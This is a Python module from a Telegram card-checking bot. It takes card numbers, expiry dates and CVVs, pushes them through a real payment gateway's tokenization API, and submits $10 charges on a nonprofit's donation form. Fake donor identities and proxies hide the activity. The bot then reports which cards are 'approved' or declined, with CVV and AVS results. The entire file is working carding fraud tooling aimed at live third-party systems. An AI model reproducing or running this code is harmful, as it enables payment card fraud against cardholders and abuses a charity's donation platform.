import requests, time, datetime, sys
sys.path.append('/checker/')
from Commands import Postgre, Staff
from Commands.Tools.addr import fake





def gate(cc:list, _bin:dict, edit:dict, bot:object) -> dict:
    RESPONSES = ['insufficient funds', 'decline cvv2/cid fail', 'avs rejected']
    CVV       = {'insufficient funds':'m', 'decline cvv2/cid fail':'n', 'avs rejected':'M'}
    data      = fake('us')['response']
    proxy     = Postgre.proxy()
    
    try:
        a = bot.editMessage(text = f"<b><i>$ Fetching Data_ ⛈</i></b>\n<b><i><u>Status: </u></i></b> <code>Preparing!</code> 🟨", message_id = edit['message_id'], chat_id = edit['chat_id'])
        
        curl = requests.session()
        #! Primer Requests
        headers1 = {'Accept':'application/json, text/plain, */*', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin':'https://form-renderer-app.donorperfect.io', 'Referer':'https://form-renderer-app.donorperfect.io/'}
        payload1 = "tokenizationKey=vZr8Pj-vK4h73-4fMmzF-YBbaAT"
        request1 = curl.post(url = 'https://secure.networkmerchants.com/token/api/create', headers = headers1, data = payload1, proxies = proxy).json()

        #! Segundo Requests
        headers2 = {'Accept':'*/*', 'Content-type':'application/json;charset=UTF-8', 'Origin':'https://secure.networkmerchants.com', 'Referer':'https://secure.networkmerchants.com/token/inline.php?tokenizationKey=vZr8Pj-vK4h73-4fMmzF-YBbaAT&token='+request1['token']+'&elementId=ccnumber&title=Card%20Number&placeholder=&enableCardBrandPreviews=false'}
        payload2 = '{"tokenizationKey":"vZr8Pj-vK4h73-4fMmzF-YBbaAT","tokenId":"'+request1['token']+'","data":[{"elementId":"ccnumber","value":"'+cc[0]+'"}]}'
        request2 = curl.post(url = 'https://secure.networkmerchants.com/token/api/save_multipart_token', headers = headers2, data = payload2, proxies = proxy).json()
                
        #! Cuarto Requests
        headers3 = {'Accept':'*/*', 'Content-type':'application/json;charset=UTF-8', 'Origin':'https://secure.networkmerchants.com', 'Referer':'https://secure.networkmerchants.com/token/inline.php?tokenizationKey=vZr8Pj-vK4h73-4fMmzF-YBbaAT&token='+request1['token']+'&elementId=ccexp&title=Card%20Expiration&placeholder=MM%20%2F%20YY'}
        payload3 = '{"tokenizationKey":"vZr8Pj-vK4h73-4fMmzF-YBbaAT","tokenId":"'+request1['token']+'","data":[{"elementId":"ccexp","value":"'+cc[1]+''+cc[2]+'"}]}'
        request3 = curl.post(url = 'https://secure.networkmerchants.com/token/api/save_multipart_token', headers = headers3, data = payload3, proxies = proxy).json()

        a = bot.editMessage(text = f"<b><i>$ Fetching Data_ ⛈</i></b>\n<b><i><u>Status: </u></i></b> <code>Checked!</code> 🟩", message_id = a['message_id'], chat_id = a['chat_id'])

        #! Segundo Requests
        headers4 = {'Accept':'*/*', 'Content-type':'application/json;charset=UTF-8', 'Origin':'https://secure.networkmerchants.com', 'Referer':'https://secure.networkmerchants.com/token/inline.php?tokenizationKey=vZr8Pj-vK4h73-4fMmzF-YBbaAT&token='+request1['token']+'&elementId=cvv&title=CVV%20Code&placeholder=&cvvDisplay=required'}
        payload4 = '{"tokenizationKey":"vZr8Pj-vK4h73-4fMmzF-YBbaAT","tokenId":"'+request1['token']+'","data":[{"elementId":"cvv", "cvvDisplay":true,"value":"'+cc[3]+'"}]}'
        request4 = curl.post(url = 'https://secure.networkmerchants.com/token/api/save_multipart_token', headers = headers4, data = payload4, proxies = proxy).json()

        #! Quinto Requests
        headers5 = {'Accept':'application/json, text/plain, */*', 'Content-type':'application/json', 'Origin':'https://form-renderer-app.donorperfect.io', 'Referer':'https://form-renderer-app.donorperfect.io/'}
        payload5 = '{"tokenId":"'+request1['token']+'","tokenizationKey":"vZr8Pj-vK4h73-4fMmzF-YBbaAT"}'
        request5 = curl.post(url = 'https://secure.networkmerchants.com/token/api/lookup', headers = headers5, data = payload5, proxies = proxy).json()
        
        #! Septimo Requests
        headers6 = {'accept':'application/json, text/plain, */*', 'content-type':'application/json', 'origin':'https://form-renderer-app.donorperfect.io', 'referer':'https://form-renderer-app.donorperfect.io/', 'newrelic':'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI2MTE4MDkiLCJhcCI6IjgzMDMxNTc3NSIsImlkIjoiYmMwNTM0YjI5YmUzNTQ1MiIsInRyIjoiZWVjODBjYjkzMDE5ZGNlMjVlZjczNDNhYjg2OGVjNjAiLCJ0aSI6MTY2ODkyODMxMzk2OX19'}
        payload6 = '{"meta-data":{"formId":"75ea7311-6f4b-4b4a-9226-a117fd915c54","formVersion":1665520725361,"formName":"Website Donation","localDateTime":"2022-11-05T18:29:26.887","hiddenFields":{"GL_CODE":"","CAMPAIGN":"","SOLICIT_CODE":"","TY_LETTER_NO":"SA","SUB_SOLICIT_CODE":""}},"data":{"frequency":"M","contact-first-name":"'+data['f_name']+'","contact-last-name":"'+data['l_name']+'","contact-email":"'+data['mail']+'","contact-phone":"","contact-address":"'+data['street']+'","contact-address2":"","contact-city":"New York","contact-state":"NY","contact-zip":"10010","same-address":true,"billing-first-name":"J'+data['f_name']+'","billing-last-name":"'+data['l_name']+'","billing-address":"Timesquare 321","billing-address2":"","billing-city":"New York","billing-state":"NY","billing-zip":"10010","billing-phone":"","amount":"10.30","tribute_on":false,"tribute_type":"M","tributes_notify":[],"offset-fee-on":true,"offset-fee-amount":"0.30","dcc-amount":"10.30"},"payment-data":{"tokenType":"inline","token":"'+request1['token']+'","card":'+str(request5['card']).replace("'", '"')+',"check":'+str(request5['check']).replace("'", '"').replace('None', 'null')+',"wallet":{"cardDetails":null,"cardNetwork":null,"email":null,"billingInfo":{"address1":null,"address2":null,"firstName":null,"lastName":null,"postalCode":null,"city":null,"state":null,"country":null,"phone":null},"shippingInfo":{"address1":null,"address2":null,"firstName":null,"lastName":null,"postalCode":null,"city":null,"state":null,"country":null,"phone":null}}},"paypal-data":{"payPalPayment":false,"orderId":null,"correlationHandle":"aeb75401-2490-4cc5-8d24-62df3fe97c07","paypalEmail":null,"paymentType":"Credit"}}'
        request6 = curl.post(url = 'https://form-renderer-api.donorperfect.io/api/FormSubmission', headers = headers6, data = payload6, proxies = proxy).json()
        
        if request6['success'] == False and 'error' in request6.keys():
            message = request6['error']['details']['ErrorMessage'].lower()
            cvv = request6['error']['details']['CVVResponse']
            avs = request6['error']['details']['AVSResponse']
            if 'duplicate order refid:' in message.lower() or 'amount exceeds limit' in message.lower():
                return {'status':True, 'response':'<code>Charged $10</code>', 'success':'approved! ✅', 'avs':'','message_id':a['message_id']}
            elif message in RESPONSES:
                message = f"<code>{message.title()}</code>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>CVV:</u></i></b> <code>{cvv}</code> | [<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>AVS:</u></i></b> <code>{avs}</code>"
                return {'status':True, 'response':message, 'success':'approved! ✅', 'avs':'','message_id':a['message_id']}
            else:
                message = f"<code>{message.title()}</code>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>CVV:</u></i></b> <code>{cvv}</code> | [<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>AVS:</u></i></b> <code>{avs}</code>"
                return {'status':True, 'response':message, 'success':'declined! ❌', 'avs':'','message_id':a['message_id']}
        else:
            if request6['success']: return {'status':True, 'response':'Charged $10', 'success':'approved! ✅', 'avs':'','message_id':a['message_id']}
            else:
                message = f"<code>{message.title()}</code>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>CVV:</u></i></b> <code>{cvv}</code> | [<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>AVS:</u></i></b> <code>{avs}</code>"
                return {'status':True, 'response':message, 'success':'declined! ❌','avs':'','message_id':a['message_id']}
    except Exception as error:
        bot.raise_post(f"Error en el gate: {str(error)[0:350]}")
        return {'status':False, 'raise':error}



def gateCmd(update, context, bot) -> None:
    bot.sendAction(chat_id = update['chat_id'], action = 'typing')
    a = bot.replyMessage(text=f"<b><i>$ Fetching Data_ ⛈</i></b>\n<b><i><u>Status: </u></i></b> <code>Waiting!</code> 🟥", chat_id = update['chat_id'], reply_id = update['message_id'])
    args = context['args'] if len(context['args']) > 0 else update['reply_to'] if update['reply_to'] != 'None' else context['args']
    args = args if type(args) == str else args['text']
    user = Postgre.view(user_id=update['user_id'])
    chat = Postgre.view(user_id=update['chat_id'])
    cmd  = Postgre.viewCmd(cmd = context['command'])
    b = Staff.gates(user = user, chat =  chat, text = args, cmd = cmd, bot = bot)
    try:    
        if b['status']:
            a = bot.editMessage(text = f"<b><i>$ Fetching Data_ ⛈</i></b>\n<b><i><u>Status: </u></i></b> <code>Checking!</code> 🟧", chat_id = update['chat_id'], message_id = a['message_id'])
            now  = time.time()
            Postgre.update(f"UPDATE users SET l_reg = '{datetime.datetime.now()}' WHERE user_id = '{update['user_id']}'")
            checker = gate(cc = b['cc'], _bin = b['bin'], edit = {'chat_id':update['chat_id'], 'message_id':a['message_id']}, bot = bot)
            if checker['status']: 
                bot.editMessage(text = f"<b><i>$ {cmd['name'].title()} 🌩</i></b>\n━━━━━━━━━━━━━━━━━\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Cc:</u></i></b> <code>{b['cc'][0]}|{b['cc'][1]}|{b['cc'][2]}|{b['cc'][3]}</code>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Status:</u></i></b> <code>{checker['success'].title()}</code>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Response:</u></i></b> {checker['response']}\n\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Info:</u></i></b> <code>{b['bin']['brand'].title()}</code> - <code>{b['bin']['type'].title()}</code> - <code>{b['bin']['level'].title()}</code>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Bank:</u></i></b> <code>{b['bin']['bank'].title()}</code>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Country:</u></i></b> <code>{b['bin']['country'].title()}</code>[{b['bin']['flag']}] - <code>{b['bin']['currency'].title()}</code>\n\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>T.Taken:</u></i></b> <code>{str(round((time.time() - now), 1))}'s</code> | <b><i><u>Proxy:</u></i></b> <code>Live[✅]</code>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>User:</u></i></b> @{update['username']} [<b>{user['c_name'].title()}</b>]\n━━━━━━━━━━━━━━━━━\n[↯] <b><i><u>By:</u></i></b> <code>SoyQuetzal</code> ☁️", chat_id=update['chat_id'], message_id=checker['message_id'])
            else: Postgre.update(f"UPDATE users SET l_reg = '{user['l_reg']}' WHERE user_id = '{update['user_id']}'"), bot.editMessage(text = f"<b><i>$ Wrong Data_ ⚠️</i></b>\n<b><i><u>Raise:</u></i></b> <code>There is a problem, contact an administrator and place recheck!</code>", chat_id = update['chat_id'], message_id = a['message_id'])
        else: bot.editMessage(text = f"{b['text']}", chat_id = update['chat_id'], message_id = a['message_id'])
    except Exception as a: bot.raise_post(f"Error en pdCMD, {str(a)}")